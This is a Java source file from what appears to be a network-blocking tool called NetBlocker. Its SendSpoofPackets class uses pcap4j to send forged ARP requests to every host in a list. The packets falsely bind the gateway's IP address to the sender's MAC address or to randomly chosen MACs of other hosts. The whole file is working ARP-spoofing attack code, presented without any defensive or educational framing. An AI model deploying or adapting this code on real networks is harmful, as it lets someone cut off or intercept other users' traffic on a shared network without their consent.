package NetBlocker.Scanners;

import NetBlocker.Main;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class SendSpoofPackets implements Runnable {

    private final InetAddress myInetAddress;
    private PcapHandle sendHandle;
    private Map<InetAddress, MacAddress> ipMap;
    private MacAddress myMacAddress;
    private boolean randomMac;
    private MacAddress[] randomMacs;
    private InetAddress gatewayAddress;
    private boolean loopback;

    public SendSpoofPackets(
            PcapHandle sendHandle,
            Map<InetAddress, MacAddress> ipMap,
            MacAddress myMacAddress,
            boolean randomMac,
            InetAddress gatewayAddress,
            boolean loopback,
            InetAddress myInetAddress) {

        this.sendHandle = sendHandle;
        this.ipMap = ipMap;
        this.myMacAddress = myMacAddress;
        this.randomMac = randomMac;
        this.gatewayAddress = gatewayAddress;
        this.loopback = loopback;
        this.myInetAddress = myInetAddress;
        randomMacs = new MacAddress[3];

    }


    @Override
    public void run() {

        try {
            Set<Map.Entry<InetAddress, MacAddress>> ipSet = ipMap.entrySet();
            for (Map.Entry<InetAddress, MacAddress> entry : ipSet) {
                if (loopback) {
                    if (Main.gatewayMacAddress != null) {
                        sendArp(entry.getKey(), entry.getValue());
                        sendLoopBackArp();
                    }
                } else {
                    if (entry.getValue() != null)
                        sendArp(entry.getKey(), entry.getValue());
                }

            }
        } catch (Exception ex) {
            ex.printStackTrace();
            System.err.println(ex.getMessage());
            System.exit(1);
        }

    }

    private void sendLoopBackArp() throws Exception {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REQUEST)
                .srcHardwareAddr(Main.gatewayMacAddress)
                .srcProtocolAddr(gatewayAddress)
                .dstHardwareAddr(myMacAddress)
                .dstProtocolAddr(myInetAddress);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder.dstAddr(myMacAddress)
                .srcAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        Packet packet = etherBuilder.build();
        sendHandle.sendPacket(packet);
    }

    private void sendArp(InetAddress ip, MacAddress mac) throws Exception {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REQUEST)
                .srcHardwareAddr(getMacAddress(mac))
                .srcProtocolAddr(gatewayAddress)
                .dstHardwareAddr(mac)
                .dstProtocolAddr(ip);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder.dstAddr(mac)
                .srcAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        Packet packet = etherBuilder.build();
        System.out.println(packet);
        sendHandle.sendPacket(packet);
    }


    private MacAddress getMacAddress(MacAddress destinationMacAddress) {
        if (isRandomMac()) {
            int randomNumber = (int) (Math.random() * 10);
            MacAddress randMac = randomMacs[randomNumber % randomMacs.length];
            if (randMac.equals(destinationMacAddress)) {
                randomNumber++;
                return randomMacs[randomNumber % randomMacs.length];
            }
            return randMac;

        } else {
            return myMacAddress;
        }
    }

    private boolean isRandomMac() {
        if (randomMac) {
            if (randomMacs[2] == null && ipMap.size() > 2) {
                List<MacAddress> randMacs = new ArrayList<>(ipMap.values());
                for (int i = 0; i < 3; i++) {
                    randomMacs[i] = randMacs.get(((int) (Math.random() * 10)) % randMacs.size());
                }
                return true;
            } else if (randomMacs[2] != null) {
                return true;
            }
            return false;
        } else {
            return false;
        }
    }
}
